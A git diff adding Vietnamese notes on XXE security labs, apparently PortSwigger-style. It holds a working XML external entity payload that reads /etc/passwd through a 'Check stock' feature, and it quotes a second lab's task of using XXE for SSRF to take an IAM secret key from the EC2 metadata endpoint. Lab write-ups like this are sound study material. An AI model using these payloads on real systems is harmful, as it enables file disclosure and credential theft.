@@ -104,20 +104,40 @@ Các lỗ hổng XXE đều phát sinh do thư viện phân tích cú pháp XML 
 ## XXE Lab
 
 
-### 
+### Lab: Exploiting XXE using external entities to retrieve files
+
+```
+This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
+
+To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.
+```
+ Mô tả trên đã chỉ ra cho chúng ta biết lỗi chúng ta có thể khai thác nằm ở chức năng "Check stock" của web, và yêu cầu chúng ta leak được file passwd thì sẽ hoàn thành.
+
+Sau khi check stock và bắt lạ request chúng ta có thể thấy 1 XML cơ bản và cách exploit vô cùng đơn giản.
 
 
 
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+<productId>&xxe;</productId>
+<storeId>1</storeId></stockCheck>
+```
 
 
 
+Thay vì kiểm tra productID như bt thì payload này sẽ tham chiếu đến thực thể bên ngoài(external entity) và truy xấu giá trị của xxe là file:///etc/passwd 
 
 
+### Lab: Exploiting XXE to perform SSRF attacks
+```
+This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
 
+The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
 
-
-
-
+To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
+```
 
 
 
